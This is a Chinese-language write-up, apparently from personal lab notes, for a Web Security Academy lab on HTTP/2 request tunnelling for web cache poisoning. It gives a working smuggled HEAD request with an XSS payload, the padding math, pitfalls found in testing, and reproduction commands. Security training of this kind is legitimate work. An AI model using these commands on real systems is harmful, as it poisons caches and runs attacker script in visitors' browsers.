---
title: lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling
---

# lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

- 题面:h2 请求隧道毒 `/` 的缓存,使每 15s 访问首页的受害者执行 `alert(1)`。
- 实例(批50):https://0a2800ce0401a85880428a4b00d800c5.web-security-academy.net
- 判定:**solved**(`academyLabBanner is-solved` + `Congratulations, you solved the lab!`,于 `/post?postId=1` 读到)

## 收口命令(一次即中)

```
M = 活测 GET / 的 content-length(本实例 8566)
h2_req <inst>/ --method HEAD \
  --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script>' \
  --pad-path-to 9000 --read-ms 6000
```

回执:200、`x-cache: miss`、`content-length: 8566`,body = 嵌套 302 原文
`HTTP/1.1 302 Found\r\nLocation: /resources/labheader/js/?<script>alert(1)</script>/;p/;p…`。
随后普通 `GET /` → **`x-cache: hit`** 且 body 同上 ⇒ 毒已入缓存;受害者的浏览器把该
`text/html` body 当 HTML 解析,执行其中的裸 `<script>alert(1)</script>`。

## 机制

外层 `HEAD /` 让后端对 `/` 只回头(无 body);前端按自己的期望长度 8566 继续读字节,把随即
到达的**嵌套 302 响应原文字节**当成 `/` 的体。`max-age=30` 且本次未命中 ⇒ 记入 `/` 的键。
cached 应答 content-type 仍是 `text/html`,故 302 原文里的裸 `<script>` 被浏览器执行 ⇒ 不需要
把毒伪装成 JS/HTML 页。

## 四个坑(批50 实测)

1. **垫片必须落内层 URI 内(query)**。`h2_req --pad-path-to N` 把整条 `:path` 截到 N 字节;
   若 `:path` 以内层 URI 结尾(不写 ` HTTP/1.1\r\nHost:`)则垫片正好落在内层 query 里,嵌套
   302 的 Location 逐字回显内层 URI ⇒ 垫 1 字节长 1 字节。**判据 = 嵌套长 ≥ M**:pad 9000
   使 Location ≈8.7KB > 8566,恰好够(pad 太小 → 短读失败)。
2. **`:path` 不得超 HEADERS 帧上限 16384B**:`tunnel_variant_scan --pad-to 20000` 单帧装不下
   ⇒ 前端 GOAWAY(无响应,易误读成"没注入")。~9000 安全。
3. **`tunnel_variant_scan --converge` 本例读不出且自坑**:其 `clean` 直发格会先把 `/` 写进缓存,
   随后注入格全成 **cache HIT**(200/8566)⇒ 无记账行、无注入效果,`pass=false` 是假阴。
   本例前端短读回 **`500 Communication timed out`**,不是 ACL 题的 `Received only N of expected M`
   —— 记账口径按 lab 不同。故用单发 `h2_req` + 自算 M。
4. **判读纪律**:毒在缓存时 `banner_verdict` 读不到 `is-solved`(它 GET / 拿到毒 body);改读另一页
   lab header(本例 `/post?postId=1`,未缓存)⇒ `academyLabBanner is-solved`。

## 复现命令

```
http_dump <inst>/                                  # M = content-length
h2_req <inst>/ --method HEAD --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script>' --pad-path-to 9000 --read-ms 6000
http_dump <inst>/ --out /tmp/hit.html              # x-cache: hit + 毒 body
http_dump '<inst>/post?postId=1' --out /tmp/b.html # is-solved 横幅
```

## 关系

- 族:[[h2-smuggling-family]]、[[cache-poisoning-family]];方法见 [[h2-tunnelling-and-h2cl-practice]]、[[cache-and-smuggling-live-mechanisms]]。
